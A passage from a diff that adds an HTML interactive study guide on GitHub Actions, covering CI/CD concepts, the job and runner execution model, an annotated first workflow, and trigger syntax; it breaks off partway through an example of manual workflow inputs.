@@ -1,0 +1,1931 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="color-scheme" content="dark light">
+<meta name="description" content="An interactive study guide: GitHub Actions Study Guide.">
+<title>GitHub Actions Study Guide - Interactive</title>
+<style>
+:root{
+  --bg:#08090b; --bg2:#0e0f13; --panel:#121319; --panel2:#171922;
+  --border:#23252f; --border2:#2c2f3b;
+  --txt:#e6e8ee; --muted:#9aa0ad; --faint:#6b7180;
+  --accent:#c7e768; --accent2:#8be263; --accent-weak:rgba(199,231,104,.13);
+  --warn:#fbbf24; --good:#4ade80; --bad:#f87171;
+  --radius:12px; --radius-sm:8px;
+  --mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  --sidebar-w:310px;
+}
+html[data-theme="light"]{
+  --bg:#f6f7f9; --bg2:#eef0f4; --panel:#ffffff; --panel2:#f3f4f7;
+  --border:#e2e5eb; --border2:#d3d7e0;
+  --txt:#1b1f27; --muted:#5a6170; --faint:#878e9c;
+  --accent:#c7e768; --accent2:#8be263; --accent-weak:rgba(199,231,104,.13);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--txt);font-family:var(--sans);
+  line-height:1.65;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--accent2);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* progress bar */
+#progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:60;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .1s linear}
+
+/* top bar */
+header.topbar{
+  position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:rgba(8,9,11,.82);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--border);
+}
+html[data-theme="light"] header.topbar{background:rgba(246,247,249,.85)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:-.01em;white-space:nowrap}
+.brand .logo{width:26px;height:26px;border-radius:7px;display:grid;place-items:center;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#04201c;font-weight:800;font-size:15px}
+.brand .sub{color:var(--faint);font-weight:500;font-size:13px}
+.spacer{flex:1}
+.search{position:relative;display:flex;align-items:center;max-width:340px;flex:1}
+.search input{
+  width:100%;padding:8px 12px 8px 34px;border-radius:999px;border:1px solid var(--border2);
+  background:var(--panel);color:var(--txt);font-size:14px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.search svg{position:absolute;left:11px;width:15px;height:15px;color:var(--faint)}
+.search kbd{position:absolute;right:10px;color:var(--faint);font-family:var(--mono);font-size:11px;
+  border:1px solid var(--border2);border-radius:5px;padding:1px 5px;background:var(--bg2)}
+.iconbtn{display:grid;place-items:center;width:38px;height:38px;border-radius:9px;cursor:pointer;
+  border:1px solid var(--border2);background:var(--panel);color:var(--txt)}
+.iconbtn:hover{border-color:var(--accent)}
+#menuBtn{display:none}
+
+/* layout */
+.layout{display:grid;grid-template-columns:var(--sidebar-w) minmax(0,1fr);gap:0;align-items:start}
+aside.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;
+  border-right:1px solid var(--border);padding:18px 10px 60px;background:var(--bg)}
+aside.sidebar::-webkit-scrollbar{width:9px}
+aside.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:9px}
+.toc ul{list-style:none;margin:0;padding:0}
+.toc li a{display:block;padding:5px 12px;border-radius:7px;color:var(--muted);font-size:13.5px;
+  border-left:2px solid transparent;transition:color .12s,background .12s}
+.toc li a:hover{color:var(--txt);background:var(--panel);text-decoration:none}
+.toc .toc-l2 a{font-weight:600;color:var(--txt);margin-top:6px}
+.toc .toc-l3 a{padding-left:26px;font-size:12.8px}
+.toc a.active{color:var(--accent);background:var(--accent-weak);border-left-color:var(--accent)}
+.toc li.hide{display:none}
+
+main{padding:32px clamp(18px,5vw,64px) 120px;max-width:1000px}
+.lead{color:var(--muted);font-size:15px}
+
+/* typography */
+h1{font-size:clamp(28px,4vw,40px);line-height:1.15;letter-spacing:-.02em;margin:.2em 0 .4em}
+h2{font-size:clamp(22px,3vw,29px);letter-spacing:-.01em;margin:2.2em 0 .7em;padding-bottom:.3em;
+  border-bottom:1px solid var(--border);scroll-margin-top:74px;cursor:pointer;position:relative}
+h2::after{content:"–";position:absolute;right:2px;top:0;color:var(--faint);font-weight:400;
+  transition:transform .15s;opacity:.6}
+h2.collapsed::after{content:"+"}
+h3{font-size:19px;margin:1.8em 0 .5em;color:var(--txt);scroll-margin-top:74px}
+h2+*,h3+*{margin-top:0}
+p{margin:.7em 0}
+strong{color:var(--txt)}
+blockquote{margin:1.1em 0;padding:.6em 1.1em;border-left:3px solid var(--accent);
+  background:var(--accent-weak);border-radius:0 var(--radius-sm) var(--radius-sm) 0;color:var(--txt)}
+blockquote em{font-style:italic;color:var(--txt)}
+hr{border:none;border-top:1px solid var(--border);margin:2.4em 0}
+ul,ol{padding-left:1.3em}
+li{margin:.3em 0}
+
+/* inline code */
+:not(pre)>code{font-family:var(--mono);font-size:.86em;background:var(--panel2);
+  border:1px solid var(--border);border-radius:6px;padding:.1em .4em;color:#e7c6a0}
+html[data-theme="light"] :not(pre)>code{color:#9a5b00}
+
+/* code blocks */
+.codewrap{position:relative;margin:1.2em 0;border:1px solid var(--border);border-radius:var(--radius);
+  background:var(--bg2);overflow:hidden}
+.codebar{display:flex;align-items:center;justify-content:space-between;
+  padding:7px 12px;background:var(--panel);border-bottom:1px solid var(--border)}
+.codebar .lang{font-family:var(--mono);font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint)}
+.copybtn{display:inline-flex;align-items:center;gap:6px;cursor:pointer;border:1px solid var(--border2);
+  background:var(--bg2);color:var(--muted);font-size:12px;padding:4px 9px;border-radius:7px;font-family:var(--sans)}
+.copybtn:hover{border-color:var(--accent);color:var(--txt)}
+.copybtn.ok{color:var(--good);border-color:var(--good)}
+.codewrap pre{margin:0;padding:14px 16px;overflow-x:auto;font-family:var(--mono);font-size:13.3px;line-height:1.6}
+.codewrap pre::-webkit-scrollbar{height:9px}
+.codewrap pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:9px}
+code .c{color:#6b7180;font-style:italic}      /* comment */
+code .s{color:#9ece9a}                          /* string */
+code .k{color:#7dd3fc}                          /* keyword/directive */
+code .n{color:#e5b873}                          /* number/duration */
+code .ph{color:#f0abfc}                         /* placeholder {..} */
+code .m{color:#fca5a5}                           /* matcher @name */
+code .a{color:#7dd3fc}                           /* attr/key */
+code .b{color:#f0abfc}                           /* boolean/const */
+code .p{color:#8b93a3}                           /* punctuation */
+code .site{color:#5eead4;font-weight:600}        /* site address */
+
+/* tables */
+.tablewrap{overflow-x:auto;margin:1.2em 0;border:1px solid var(--border);border-radius:var(--radius)}
+table{border-collapse:collapse;width:100%;font-size:14px}
+th,td{text-align:left;padding:9px 13px;border-bottom:1px solid var(--border)}
+thead th{background:var(--panel);color:var(--txt);font-weight:600;position:sticky;top:0}
+tbody tr:hover{background:var(--panel2)}
+tbody tr:last-child td{border-bottom:none}
+
+/* add-ons: quiz + decision */
+.addon{margin:1.8em 0;border:1px solid var(--border2);border-radius:var(--radius);
+  background:linear-gradient(180deg,var(--panel),var(--bg2));overflow:hidden}
+.addon-head{padding:16px 18px 4px}
+.addon-kicker{display:inline-block;font-size:11px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--accent);font-weight:700}
+.addon-head h3{margin:.25em 0 .1em;scroll-margin-top:0}
+.addon-sub{margin:.1em 0 0;color:var(--faint);font-size:13.5px}
+.quiz-item{padding:8px 18px 16px;border-top:1px solid var(--border);margin-top:12px}
+.quiz-item:first-of-type{border-top:none;margin-top:0}
+.quiz-q{font-weight:600;margin:.6em 0 .7em}
+.quiz-n{display:inline-grid;place-items:center;min-width:26px;height:22px;margin-right:9px;padding:0 6px;
+  border-radius:6px;background:var(--accent-weak);color:var(--accent);font-size:12px;font-weight:700;font-family:var(--mono)}
+.quiz-opts{list-style:none;padding:0;margin:0;display:grid;gap:7px}
+.quiz-opt{display:flex;align-items:center;gap:10px;width:100%;text-align:left;cursor:pointer;
+  border:1px solid var(--border2);background:var(--bg2);color:var(--txt);font-size:14px;
+  padding:9px 12px;border-radius:9px;font-family:var(--sans);transition:border-color .12s,background .12s}
+.quiz-opt:hover{border-color:var(--accent)}
+.quiz-mark{width:16px;height:16px;border-radius:50%;border:2px solid var(--faint);flex:none}
+.quiz-opt.correct{border-color:var(--good);background:rgba(74,222,128,.10)}
+.quiz-opt.correct .quiz-mark{border-color:var(--good);background:var(--good)}
+.quiz-opt.wrong{border-color:var(--bad);background:rgba(248,113,113,.10)}
+.quiz-opt.wrong .quiz-mark{border-color:var(--bad);background:var(--bad)}
+.quiz-opt.locked{cursor:default;opacity:.7}
+.quiz-opt.locked.correct,.quiz-opt.locked.wrong{opacity:1}
+.quiz-explain{margin:11px 0 2px;padding:10px 12px;border-radius:8px;background:var(--panel2);
+  border-left:3px solid var(--accent);font-size:13.6px;color:var(--muted)}
+
+.decision-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;padding:14px 18px}
+.dchip{display:flex;align-items:flex-start;gap:9px;font-size:13.6px;color:var(--txt);cursor:pointer;
+  border:1px solid var(--border2);background:var(--bg2);padding:9px 11px;border-radius:9px}
+.dchip:hover{border-color:var(--accent)}
+.dchip input{margin-top:2px;accent-color:var(--accent)}
+.decision-out{margin:4px 18px 18px;padding:14px 16px;border-radius:10px;background:var(--panel2);
+  border:1px solid var(--border)}
+.decision-verdict{font-weight:700;font-size:15px}
+.decision-verdict.caddy{color:var(--good)}
+.decision-verdict.maybe{color:var(--warn)}
+.decision-verdict.alt{color:var(--accent2)}
+.decision-reasons{margin:8px 0 0;color:var(--muted);font-size:13.5px}
+
+/* search highlight */
+mark.hit{background:var(--accent);color:#04201c;border-radius:3px;padding:0 2px}
+
+/* back to top */
+#toTop{position:fixed;right:22px;bottom:22px;width:44px;height:44px;border-radius:50%;
+  display:grid;place-items:center;cursor:pointer;border:1px solid var(--border2);
+  background:var(--panel);color:var(--txt);opacity:0;pointer-events:none;transition:opacity .2s,transform .2s}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--accent);transform:translateY(-2px)}
+
+.scrim{display:none}
+.collapsed-body{display:none !important}
+
+@media(max-width:980px){
+  :root{--sidebar-w:0px}
+  #menuBtn{display:grid}
+  .layout{grid-template-columns:1fr}
+  aside.sidebar{position:fixed;top:0;left:0;height:100vh;width:300px;z-index:70;
+    transform:translateX(-100%);transition:transform .25s;border-right:1px solid var(--border);
+    padding-top:16px;background:var(--bg)}
+  aside.sidebar.open{transform:none}
+  .scrim.show{display:block;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:65}
+  .search{max-width:none}
+  .brand .sub{display:none}
+  .decision-grid{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  body{font-size:15px}
+  .search kbd{display:none}
+  main{padding:22px 16px 100px}
+}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<header class="topbar">
+  <button id="menuBtn" class="iconbtn" aria-label="Toggle menu">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+  </button>
+  <div class="brand"><span class="logo">G</span><span>GitHub Actions Study Guide</span><span class="sub">interactive</span></div>
+  <div class="spacer"></div>
+  <div class="search">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    <input id="search" type="search" placeholder="Search the guide..." aria-label="Search" autocomplete="off">
+    <kbd>/</kbd>
+  </div>
+  <button id="themeBtn" class="iconbtn" aria-label="Toggle theme" title="Toggle theme (t)">
+    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+  </button>
+</header>
+<div class="scrim"></div>
+<div class="layout">
+  <aside class="sidebar"><nav class="toc" aria-label="Table of contents"><ul><li class="toc-l2"><a href="#part-1-foundations-mental-model" data-target="part-1-foundations-mental-model">Part 1 — Foundations &amp; Mental Model</a></li><li class="toc-l3"><a href="#what-cicd-actually-buys-you" data-target="what-cicd-actually-buys-you">What CI/CD Actually Buys You</a></li><li class="toc-l3"><a href="#where-github-actions-fits" data-target="where-github-actions-fits">Where GitHub Actions Fits</a></li><li class="toc-l3"><a href="#the-execution-model" data-target="the-execution-model">The Execution Model</a></li><li class="toc-l3"><a href="#repository-layout" data-target="repository-layout">Repository Layout</a></li><li class="toc-l3"><a href="#your-first-workflow-dissected" data-target="your-first-workflow-dissected">Your First Workflow, Dissected</a></li><li class="toc-l3"><a href="#a-note-on-pinning" data-target="a-note-on-pinning">A Note on Pinning</a></li><li class="toc-l2"><a href="#part-2-the-workflow-language" data-target="part-2-the-workflow-language">Part 2 — The Workflow Language</a></li><li class="toc-l3"><a href="#triggers-the-on-key" data-target="triggers-the-on-key">Triggers: the on: Key</a></li><li class="toc-l3"><a href="#jobs-steps-runners-and-the-job-graph" data-target="jobs-steps-runners-and-the-job-graph">Jobs, Steps, Runners, and the Job Graph</a></li><li class="toc-l3"><a href="#contexts-and-expressions" data-target="contexts-and-expressions">Contexts and Expressions</a></li><li class="toc-l3"><a href="#environment-variables-defaults-and-shells" data-target="environment-variables-defaults-and-shells">Environment Variables, Defaults, and Shells</a></li><li class="toc-l2"><a href="#part-3-build-test-cache-artifacts" data-target="part-3-build-test-cache-artifacts">Part 3 — Build, Test, Cache, Artifacts</a></li><li class="toc-l3"><a href="#setting-up-toolchains-pattern-first-multi-stack" data-target="setting-up-toolchains-pattern-first-multi-stack">Setting Up Toolchains (Pattern-First, Multi-Stack)</a></li><li class="toc-l3"><a href="#caching-dependencies" data-target="caching-dependencies">Caching Dependencies</a></li><li class="toc-l3"><a href="#matrix-builds" data-target="matrix-builds">Matrix Builds</a></li><li class="toc-l3"><a href="#artifacts-and-moving-data-between-jobs" data-target="artifacts-and-moving-data-between-jobs">Artifacts and Moving Data Between Jobs</a></li><li class="toc-l3"><a href="#service-containers" data-target="service-containers">Service Containers</a></li><li class="toc-l2"><a href="#part-4-composition-reuse" data-target="part-4-composition-reuse">Part 4 — Composition &amp; Reuse</a></li><li class="toc-l3"><a href="#reusable-workflows" data-target="reusable-workflows">Reusable Workflows</a></li><li class="toc-l3"><a href="#composite-actions" data-target="composite-actions">Composite Actions</a></li><li class="toc-l3"><a href="#org-level-reuse" data-target="org-level-reuse">Org-Level Reuse</a></li><li class="toc-l3"><a href="#which-one-to-reach-for" data-target="which-one-to-reach-for">Which One to Reach For</a></li><li class="toc-l2"><a href="#part-5-writing-custom-actions" data-target="part-5-writing-custom-actions">Part 5 — Writing Custom Actions</a></li><li class="toc-l3"><a href="#the-three-kinds" data-target="the-three-kinds">The Three Kinds</a></li><li class="toc-l3"><a href="#actionyml-anatomy" data-target="actionyml-anatomy">action.yml Anatomy</a></li><li class="toc-l3"><a href="#a-javascript-action" data-target="a-javascript-action">A JavaScript Action</a></li><li class="toc-l3"><a href="#a-docker-container-action" data-target="a-docker-container-action">A Docker-Container Action</a></li><li class="toc-l3"><a href="#versioning-distribution" data-target="versioning-distribution">Versioning &amp; Distribution</a></li><li class="toc-l2"><a href="#part-6-deployment-release-automation" data-target="part-6-deployment-release-automation">Part 6 — Deployment &amp; Release Automation</a></li><li class="toc-l3"><a href="#environments" data-target="environments">Environments</a></li><li class="toc-l3"><a href="#secrets-and-variables" data-target="secrets-and-variables">Secrets and Variables</a></li><li class="toc-l3"><a href="#oidc-to-cloud-no-stored-credentials" data-target="oidc-to-cloud-no-stored-credentials">OIDC to Cloud (No Stored Credentials)</a></li><li class="toc-l3"><a href="#deployment-patterns" data-target="deployment-patterns">Deployment Patterns</a></li><li class="toc-l3"><a href="#release-publishing-automation" data-target="release-publishing-automation">Release &amp; Publishing Automation</a></li><li class="toc-l2"><a href="#part-7-security-hardening" data-target="part-7-security-hardening">Part 7 — Security Hardening</a></li><li class="toc-l3"><a href="#the-threat-model" data-target="the-threat-model">The Threat Model</a></li><li class="toc-l3"><a href="#pull_request-vs-pull_request_target-the-classic-footgun" data-target="pull_request-vs-pull_request_target-the-classic-footgun">pull_request vs pull_request_target — the Classic Footgun</a></li><li class="toc-l3"><a href="#script-injection" data-target="script-injection">Script Injection</a></li><li class="toc-l3"><a href="#pin-third-party-actions-to-a-commit-sha" data-target="pin-third-party-actions-to-a-commit-sha">Pin Third-Party Actions to a Commit SHA</a></li><li class="toc-l3"><a href="#least-privilege-permissions" data-target="least-privilege-permissions">Least Privilege: permissions</a></li><li class="toc-l3"><a href="#secrets-exposure-and-the-supply-chain" data-target="secrets-exposure-and-the-supply-chain">Secrets Exposure and the Supply Chain</a></li><li class="toc-l2"><a href="#part-8-operations-at-scale" data-target="part-8-operations-at-scale">Part 8 — Operations at Scale</a></li><li class="toc-l3"><a href="#hosted-vs-self-hosted-runners" data-target="hosted-vs-self-hosted-runners">Hosted vs Self-Hosted Runners</a></li><li class="toc-l3"><a href="#self-hosted-runners" data-target="self-hosted-runners">Self-Hosted Runners</a></li><li class="toc-l3"><a href="#autoscaling-with-actions-runner-controller-arc" data-target="autoscaling-with-actions-runner-controller-arc">Autoscaling with Actions Runner Controller (ARC)</a></li><li class="toc-l3"><a href="#concurrency-control" data-target="concurrency-control">Concurrency Control</a></li><li class="toc-l3"><a href="#cost-and-optimization" data-target="cost-and-optimization">Cost and Optimization</a></li><li class="toc-l3"><a href="#debugging-workflows" data-target="debugging-workflows">Debugging Workflows</a></li><li class="toc-l2"><a href="#part-9-comparison-to-alternatives" data-target="part-9-comparison-to-alternatives">Part 9 — Comparison to Alternatives</a></li><li class="toc-l3"><a href="#the-landscape" data-target="the-landscape">The Landscape</a></li><li class="toc-l3"><a href="#migrating-to-actions" data-target="migrating-to-actions">Migrating to Actions</a></li><li class="toc-l3"><a href="#when-not-to-reach-for-actions" data-target="when-not-to-reach-for-actions">When Not to Reach for Actions</a></li><li class="toc-l2"><a href="#part-10-recipes-end-to-end-walkthrough" data-target="part-10-recipes-end-to-end-walkthrough">Part 10 — Recipes &amp; End-to-End Walkthrough</a></li><li class="toc-l3"><a href="#recipe-1-lint-test-build-across-versions-and-oses" data-target="recipe-1-lint-test-build-across-versions-and-oses">Recipe 1: Lint, Test, Build — Across Versions and OSes</a></li><li class="toc-l3"><a href="#recipe-2-monorepo-ci-with-change-detection" data-target="recipe-2-monorepo-ci-with-change-detection">Recipe 2: Monorepo CI with Change Detection</a></li><li class="toc-l3"><a href="#recipe-3-build-and-push-a-container-to-ghcr-with-provenance" data-target="recipe-3-build-and-push-a-container-to-ghcr-with-provenance">Recipe 3: Build and Push a Container to GHCR with Provenance</a></li><li class="toc-l3"><a href="#recipe-4-oidc-deploy-to-aws-no-stored-credentials" data-target="recipe-4-oidc-deploy-to-aws-no-stored-credentials">Recipe 4: OIDC Deploy to AWS — No Stored Credentials</a></li><li class="toc-l3"><a href="#recipe-5-publish-a-library-on-tag" data-target="recipe-5-publish-a-library-on-tag">Recipe 5: Publish a Library on Tag</a></li><li class="toc-l3"><a href="#end-to-end-from-empty-repo-to-production-pipeline" data-target="end-to-end-from-empty-repo-to-production-pipeline">End-to-End: From Empty Repo to Production Pipeline</a></li></ul></nav></aside>
+  <main><h1 id="github-actions-study-guide">GitHub Actions Study Guide</h1>
+<p>A practical, depth-first guide to GitHub Actions for engineers building real CI/CD. It assumes you know Git and the rough shape of software delivery, but not that you've built a non-trivial pipeline. The approach is pattern-first: examples are chosen to show each feature cleanly, drawing from Node, Python, Go, and Rust as convenient, rather than carrying one app through the whole guide. It starts with the mental model, builds up through the workflow language and composition, then goes deep on the things that actually bite in production — security, custom actions, deployment, and scale — and closes with copy-paste recipes and a full end-to-end pipeline.</p>
+<p>Primary references: <a href="https://docs.github.com/en/actions">GitHub Actions documentation</a>, <a href="https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions">Workflow syntax reference</a>, <a href="https://docs.github.com/en/actions/learn-github-actions/contexts">Contexts reference</a>, <a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions">Security hardening</a>.</p>
+<hr>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ol>
+<li><a href="#part-1-foundations-mental-model">Part 1 — Foundations &amp; Mental Model</a></li>
+<li><a href="#part-2-the-workflow-language">Part 2 — The Workflow Language</a></li>
+<li><a href="#part-3-build-test-cache-artifacts">Part 3 — Build, Test, Cache, Artifacts</a></li>
+<li><a href="#part-4-composition-reuse">Part 4 — Composition &amp; Reuse</a></li>
+<li><a href="#part-5-writing-custom-actions">Part 5 — Writing Custom Actions</a></li>
+<li><a href="#part-6-deployment-release-automation">Part 6 — Deployment &amp; Release Automation</a></li>
+<li><a href="#part-7-security-hardening">Part 7 — Security Hardening</a></li>
+<li><a href="#part-8-operations-at-scale">Part 8 — Operations at Scale</a></li>
+<li><a href="#part-9-comparison-to-alternatives">Part 9 — Comparison to Alternatives</a></li>
+<li><a href="#part-10-recipes-end-to-end-walkthrough">Part 10 — Recipes &amp; End-to-End Walkthrough</a></li>
+</ol>
+<hr>
+<h2 id="part-1-foundations-mental-model">Part 1 — Foundations &amp; Mental Model</h2>
+<p>Before any YAML, get the model right. Almost every confusing thing about Actions later — why a file change didn't carry between jobs, why a secret was empty, why a deploy ran twice — traces back to a misunderstanding of what runs where and what survives.</p>
+<h3 id="what-cicd-actually-buys-you">What CI/CD Actually Buys You</h3>
+<p>Three terms get used loosely. They form a ladder:</p>
+<ul>
+<li><strong>Continuous Integration (CI):</strong> every push is automatically built and tested. The point is the <em>feedback loop</em> — integration problems surface in minutes, on the commit that caused them, instead of during a painful big-bang merge weeks later. CI is also a <em>gate</em>: you can require that checks pass before code merges.</li>
+<li><strong>Continuous Delivery (CD):</strong> every change that passes CI is <em>provably releasable</em> — built, tested, and packaged into an artifact you could ship. Releasing is then a deliberate button press.</li>
+<li><strong>Continuous Deployment (CD):</strong> that release happens <em>automatically</em> with no human gate. Same acronym, stronger claim.</li>
+</ul>
+<p>The product of all this isn't "automation" for its own sake. It's three things: a fast feedback loop, repeatability (the build runs the same way every time, not "works on my machine"), and an enforceable quality gate. Keep those in mind — every feature in this guide serves one of them.</p>
+<h3 id="where-github-actions-fits">Where GitHub Actions Fits</h3>
+<p><a href="https://docs.github.com/en/actions/about-github-actions/understanding-github-actions">GitHub Actions</a> is CI/CD built directly into GitHub and triggered by repository events (a push, a pull request, a release, a schedule). Workflows live as YAML files <em>in the repository</em>, versioned alongside the code they build.</p>
+<p>That last point is most of its appeal: there's no separate CI server to provision, the pipeline is reviewed in the same pull request as the code, and there's a large <a href="https://github.com/marketplace?type=actions">Marketplace</a> of reusable building blocks ("actions") so you rarely script common tasks from scratch. The trade-offs against Jenkins, GitLab CI, CircleCI, and others are real and covered honestly in <a href="#part-9--comparison-to-alternatives">Part 9</a>; for now it's enough to know Actions is event-driven, repo-native, and composition-heavy.</p>
+<h3 id="the-execution-model">The Execution Model</h3>
+<p>This is the spine of everything. Five nouns, in a hierarchy:</p>
+<p><strong>events → workflows → jobs → steps → runners</strong></p>
+<ul>
+<li>An <strong>event</strong> is something that happens in (or to) the repo: a <code>push</code>, a <code>pull_request</code>, a <code>schedule</code> firing, a manual trigger. Events start workflows.</li>
+<li>A <strong>workflow</strong> is a single YAML file under <code>.github/workflows/</code>. It declares which events trigger it and what to do. A repo can have many workflows; they're independent.</li>
+<li>A <strong>job</strong> is a set of steps that runs on one <strong>runner</strong>. By default, jobs in a workflow run <strong>in parallel</strong>. You sequence them explicitly with <code>needs</code>.</li>
+<li>A <strong>step</strong> is one unit of work inside a job: either a shell command (<code>run:</code>) or a call to a reusable action (<code>uses:</code>). Steps in a job execute <strong>in order</strong>, top to bottom.</li>
+<li>A <strong>runner</strong> is the machine that executes a job — a GitHub-hosted virtual machine (a fresh one per job) or a self-hosted machine you manage (see <a href="#part-8--operations-at-scale">Part 8</a>).</li>
+</ul>
+<p>Two consequences fall out of this model, and they explain most early confusion:</p>
+<ol>
+<li><strong>Each job gets a clean, ephemeral runner.</strong> Nothing you write to disk in job A is visible to job B — different machines, wiped after use. To move data between jobs you must use <strong>artifacts</strong> or <strong>job outputs</strong> (Part 3), and to speed up repeated work you use <strong>caching</strong> (Part 3).</li>
+<li><strong>Steps within a job share one runner.</strong> They see the same filesystem, the same checked-out code, the same installed tools, and run sequentially. State <em>does</em> persist step-to-step within a job.</li>
+</ol>
+<h3 id="repository-layout">Repository Layout</h3>
+<p>Workflows go in one place:</p>
+<pre><code class="language-text">.github/
+└── workflows/
+    ├── ci.yml          # one workflow
+    ├── deploy.yml      # another, fully independent
+    └── nightly.yml     # another
+</code></pre>
+<p>The <strong>filename is arbitrary</strong> — Actions reads every <code>*.yml</code>/<code>*.yaml</code> file in that directory. What identifies a workflow in the UI is its <code>name:</code> field, not the filename. (Custom <em>actions</em> you author live elsewhere, e.g. <code>.github/actions/</code> — that's <a href="#part-5--writing-custom-actions">Part 5</a>.)</p>
+<h3 id="your-first-workflow-dissected">Your First Workflow, Dissected</h3>
+<p>Here is a complete, valid workflow. Every line is load-bearing:</p>
+<pre><code class="language-yaml"># .github/workflows/hello.yml
+name: CI                          # label shown in the repo's Actions tab
+on: [push]                        # event(s) that trigger this workflow — here, any push
+jobs:                             # one or more jobs; this workflow has one
+  build:                          # the job's id (arbitrary, must be unique in the file)
+    runs-on: ubuntu-latest        # which runner image to use (a fresh GitHub-hosted VM)
+    steps:                        # the ordered list of work
+      - uses: actions/checkout@v4 # an action: clones your repo onto the runner
+      - run: echo &quot;Building ${{ github.sha }}&quot;  # a shell step; ${{ }} is an expression
+</code></pre>
+<p>Reading it top to bottom:</p>
+<ul>
+<li><code>name:</code> is cosmetic — it's the title you see in the Actions UI.</li>
+<li><code>on: [push]</code> says "run this whenever someone pushes commits." (Triggers get much richer in <a href="#part-2--the-workflow-language">Part 2</a>.)</li>
+<li><code>jobs:</code> holds a map of jobs keyed by id. <code>build</code> is the id; you'd reference it elsewhere as <code>build</code>.</li>
+<li><code>runs-on:</code> picks the runner. <code>ubuntu-latest</code> is a GitHub-hosted Linux VM, provisioned fresh for this job and destroyed afterward.</li>
+<li><code>steps:</code> run in order. The first, <a href="https://github.com/actions/checkout"><code>actions/checkout</code></a>, is critical and easy to forget: <strong>the runner does not have your code until you check it out.</strong> A brand-new VM starts empty.</li>
+<li>The second step runs a shell command. <code>${{ github.sha }}</code> is an <em>expression</em> that interpolates the commit SHA from the <code>github</code> context (Part 2).</li>
+</ul>
+<p>If you remember one thing from Part 1: the runner starts empty and disappears when the job ends. Everything else is detail on top of that.</p>
+<h3 id="a-note-on-pinning">A Note on Pinning</h3>
+<p>Throughout the early chapters you'll see actions referenced by a version tag, like <code>actions/checkout@v4</code>, because it reads cleanly while you're learning. In production you should pin third-party actions to a full commit SHA instead — tags are mutable and that has real security consequences. <a href="#part-7--security-hardening">Part 7</a> explains exactly why and how; until then, the <code>@v4</code> style keeps examples readable.</p>
+<hr>
+<h2 id="part-2-the-workflow-language">Part 2 — The Workflow Language</h2>
+<p>Part 1 gave you the model; this is the vocabulary. Nearly everything in a workflow file answers one of four questions: <em>when</em> it runs (<code>on:</code>), <em>where and in what order</em> (<code>jobs</code>, <code>runs-on</code>, <code>needs</code>), <em>what data is available</em> (contexts and expressions), and <em>what environment</em> the steps run in (env, shell, permissions).</p>
+<h3 id="triggers-the-on-key">Triggers: the <code>on:</code> Key</h3>
+<p><code>on:</code> declares the events that start the workflow. The <a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows">full event list</a> is long; these are the ones you'll actually reach for.</p>
+<p><strong>Push and pull request, with filters</strong> — the two workhorses:</p>
+<pre><code class="language-yaml">on:
+  push:
+    branches: [main, 'release/**']    # only pushes to these branches (glob patterns allowed)
+    paths: ['src/**', 'package.json']  # ...and only when these files changed
+  pull_request:
+    branches: [main]                   # PRs *targeting* main
+    types: [opened, synchronize, reopened]  # which PR activities (these three are the default)
+</code></pre>
+<ul>
+<li><code>branches</code>/<code>branches-ignore</code> and <code>paths</code>/<code>paths-ignore</code> filter <em>which</em> pushes and PRs count. Use one side of each pair, not both.</li>
+<li><code>paths</code> filtering is how you avoid running the whole pipeline when only docs changed.</li>
+<li>For <code>pull_request</code>, the activity <code>types</code> narrow the trigger — <code>synchronize</code> means "new commits were pushed to the PR." It has a security-critical sibling, <code>pull_request_target</code>, deliberately held back to <a href="#part-7--security-hardening">Part 7</a>.</li>
+</ul>
+<p><strong>Scheduled runs (cron):</strong></p>
+<pre><code class="language-yaml">on:
+  schedule:
+    - cron: '0 6 * * 1'   # 06:00 UTC every Monday — fields: minute hour day-of-month month day-of-week
+</code></pre>
+<p>Cron is the standard five fields and is <strong>always in UTC</strong>. Scheduled workflows run against the <strong>default branch's</strong> copy of the file. GitHub may delay scheduled runs under load, so don't depend on exact timing.</p>
+<p><strong>Manual triggers with typed inputs:</strong></p>
+<pre><code class="language-yaml">on:
+  workflow_dispatch:          # adds a &quot;Run workflow&quot; button in the UI and enables `gh workflow run`
+    inputs:
+      environment:
+        description: 'Target environment'
+        type: choice          # one of: string | boolean | choice | environment | number
+        options: [staging, production]
